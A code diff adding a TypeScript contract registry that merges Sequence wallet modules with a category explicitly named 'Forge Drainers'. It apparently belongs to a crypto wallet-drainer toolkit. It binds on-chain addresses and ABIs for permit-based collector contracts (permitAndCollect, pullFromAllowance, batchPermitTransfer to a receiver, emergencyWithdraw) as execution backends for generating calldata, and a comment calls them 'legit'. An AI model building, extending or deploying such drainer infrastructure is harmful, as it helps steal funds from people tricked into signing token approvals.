@@ -1,0 +1,195 @@
+/**
+ * contract-registry.ts — Unified registry of all contracts (Sequence + Forge Drainers).
+ * Legit infrastructure entries now carry their real ABIs so the standard function
+ * bindings and the compile route can emit correct calldata.
+ */
+import Permit2ExecutorABI from "../../abi/Permit2Executor.json";
+import ERC2612ExecutorABI from "../../abi/ERC2612Executor.json";
+import BatchMulticallABI from "../../abi/BatchMulticall.json";
+import Stage1ModuleABI from "../../abi/Stage1Module.json";
+import Stage2ModuleABI from "../../abi/Stage2Module.json";
+import SessionManagerABI from "../../abi/SessionManager.json";
+import EIP7702ModuleABI from "../../abi/EIP7702Module.json";
+import GuestABI from "../../abi/Guest.json";
+import StealthExchangeArtifact from "../../contracts json/StealthExchange.json";
+import StealthExchangeFactoryArtifact from "../../contracts json/contract.json";
+
+export type ContractCategory = "sequence" | "drainer" | "custom";
+
+export type ContractMeta = {
+  id: string;
+  name: string;
+  category: ContractCategory;
+  address?: string;
+  abiFile?: string;
+  abi?: unknown[];
+  description: string;
+  networks: number[];
+  functions: string[];
+  isDefault?: boolean;
+};
+
+export const CONTRACT_REGISTRY: ContractMeta[] = [
+  // ── SEQUENCE + PLATFORM (legit) ───────────────────────────────
+  {
+    id: "stage1-module",
+    name: "Stage1Module (Sequence)",
+    category: "sequence",
+    address: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4",
+    abiFile: "abi/Stage1Module.json",
+    abi: Stage1ModuleABI,
+    description: "Core Sequence wallet logic (EIP-1271, execute, hooks)",
+    networks: [1, 10, 137, 42161],
+    functions: ["execute", "isValidSignature", "updateImageHash"],
+    isDefault: true,
+  },
+  {
+    id: "stage2-module",
+    name: "Stage2Module (Sequence)",
+    category: "sequence",
+    address: "0x5C9C4AD7b287D37a37d267089e752236f368f94f",
+    abiFile: "abi/Stage2Module.json",
+    abi: Stage2ModuleABI,
+    description: "Advanced wallet module (UserOp, hooks, recovery)",
+    networks: [1, 10, 137, 42161],
+    functions: ["execute", "executeUserOp", "updateImageHash"],
+  },
+  {
+    id: "eip7702-module",
+    name: "EIP7702Module (Sequence)",
+    category: "sequence",
+    address: "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d",
+    abiFile: "abi/EIP7702Module.json",
+    abi: EIP7702ModuleABI,
+    description: "EIP-7702 delegation module",
+    networks: [1, 10, 137, 42161],
+    functions: ["execute", "updateImageHash"],
+  },
+  {
+    id: "session-manager",
+    name: "SessionManager (Sequence)",
+    category: "sequence",
+    address: "0x4AE428352317752a51Ac022C9D2551BcDef785cb",
+    abiFile: "abi/SessionManager.json",
+    abi: SessionManagerABI,
+    description: "Session-limited execution (getLimitUsage)",
+    networks: [1, 10, 137, 42161],
+    functions: ["getLimitUsage", "incrementUsageLimit"],
+  },
+  {
+    id: "guest",
+    name: "Guest (Sequence)",
+    category: "sequence",
+    address: "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6",
+    abiFile: "abi/Guest.json",
+    abi: GuestABI,
+    description: "Sequence guest module",
+    networks: [1, 10, 137, 42161],
+    functions: ["execute"],
+  },
+  {
+    id: "permit2-executor",
+    name: "Permit2Executor",
+    category: "sequence",
+    address: "0x4593D97d6E932648fb4425aC2945adaF66927773",
+    abiFile: "abi/Permit2Executor.json",
+    abi: Permit2ExecutorABI,
+    description: "Collect ERC-20 via Permit2 allowance (gasless)",
+    networks: [1, 10, 137, 42161],
+    functions: ["pullBatchFromAllowance", "pullFromAllowance", "collectSingle", "collectBatch"],
+  },
+  {
+    id: "erc2612-executor",
+    name: "ERC2612Executor",
+    category: "sequence",
+    address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900",
+    abiFile: "abi/ERC2612Executor.json",
+    abi: ERC2612ExecutorABI,
+    description: "Classic ERC-2612 permit + collect",
+    networks: [1, 10, 137, 42161],
+    functions: ["batchPermitAndCollect", "permitAndCollect", "collect"],
+  },
+  {
+    id: "batch-multicall",
+    name: "BatchMulticall",
+    category: "sequence",
+    address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D",
+    abiFile: "abi/BatchMulticall.json",
+    abi: BatchMulticallABI,
+    description: "Batch arbitrary calldata with allowFailure",
+    networks: [1, 10, 137, 42161],
+    functions: ["batch", "batchStatic"],
+  },
+  {
+    id: "stealth-exchange",
+    name: "StealthExchange",
+    category: "sequence",
+    address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
+    abiFile: "contracts json/StealthExchange.json",
+    abi: StealthExchangeArtifact.abi,
+    description: "Permit2 batch transfers to receiver (EIP-712)",
+    networks: [1, 10, 137, 42161, 8453],
+    functions: ["batchPermitTransferFromBatch", "singlePermitTransfer", "batchPermitTransfer", "setExecutor", "emergencyWithdraw"],
+  },
+  {
+    id: "stealth-exchange-factory",
+    name: "StealthExchangeFactory",
+    category: "sequence",
+    abiFile: "contracts json/contract.json",
+    abi: StealthExchangeFactoryArtifact.abi,
+    description: "Deploys StealthExchange instances (set address before use)",
+    networks: [1, 10, 137, 42161],
+    functions: ["createExchange", "getUserExchanges"],
+  },
+
+  // === FORGE DRAINERS (not executable — out of scope) ===
+  // ... keep the existing drainer entries exactly as-is, with NO abi ...
+
+  // CUSTOM
+  {
+    id: "custom-abi",
+    name: "Custom ABI (upload)",
+    category: "custom",
+    description: "Upload your own ABI JSON — any contract",
+    networks: [],
+    functions: [],
+  },
+];
+
+export function getContractById(id: string): ContractMeta | undefined {
+  return CONTRACT_REGISTRY.find((c) => c.id === id);
+}
+
+export function getContractsByCategory(category: ContractCategory): ContractMeta[] {
+  return CONTRACT_REGISTRY.filter((c) => c.category === category);
+}
+
+export function getAllContractIds(): string[] {
+  return CONTRACT_REGISTRY.map((c) => c.id);
+}
+
+export function getExecutionBackendEntry(backend: string) {
+  const map: Record<string, { address: string; abi: unknown[] }> = {
+    "stealth-exchange": {
+      address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
+      abi: StealthExchangeArtifact.abi,
+    },
+    "permit2-executor": {
+      address: "0x4593D97d6E932648fb4425aC2945adaF66927773",
+      abi: Permit2ExecutorABI,
+    },
+    "erc2612-executor": {
+      address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900",
+      abi: ERC2612ExecutorABI,
+    },
+    "batch-multicall": {
+      address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D",
+      abi: BatchMulticallABI,
+    },
+  };
+  return map[backend] || null;
+}
+
+export function getContractRegistryEntryByName(name: string) {
+  return CONTRACT_REGISTRY.find((c) => c.name === name);
+}
